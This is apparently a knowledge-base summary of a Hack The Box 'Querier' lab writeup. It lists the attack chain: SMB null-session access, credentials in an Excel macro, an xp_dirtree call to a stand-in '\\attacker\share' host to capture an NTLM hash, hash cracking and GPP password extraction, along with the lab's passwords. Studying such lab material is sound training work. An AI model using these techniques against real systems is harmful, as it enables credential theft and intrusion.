---
type: source
title: "HTB Querier writeup"
raw: raw/htb-querier.md
source_type: htb-writeup
ingested: 2026-07-09
machine: [[querier]]
---

# Source: HTB Querier writeup

> Complete writeup for HTB Querier covering SMB share enumeration, Excel macro analysis, MSSQL NTLM relay attacks, xp_cmdshell command execution, and GPP password extraction for Administrator access.

## Key facts extracted

- **SMB Share**: Reports share accessible via null session containing Currency Volume Report.xlsm
- **MSSQL Creds**: reporting / PcwTWTHRwryjc$c6 from Excel VBA macro connection string
- **NTLM Relay**: Using xp_dirtree '\\attacker\share' to capture mssql-svc Net-NTLMv2 hash
- **Cracked Password**: mssql-svc / corporate568 from hashcat mode 5600
- **GPP Password**: Administrator / MyUnclesAreMarioAndLuigi!!1! from Groups.xml
- **Privesc Paths**: PowerUp.ps1 identified 5 escalation vectors including modifiable service, DLL hijack, and GPP

## Filed into

[[querier]], [[rpc-null-session]], [[smb]], [[credential-extraction]], [[ntlm-relay]], [[hash-cracking]], [[mssql-xp-cmdshell]], [[gpp-cpassword]], [[password-reuse]]
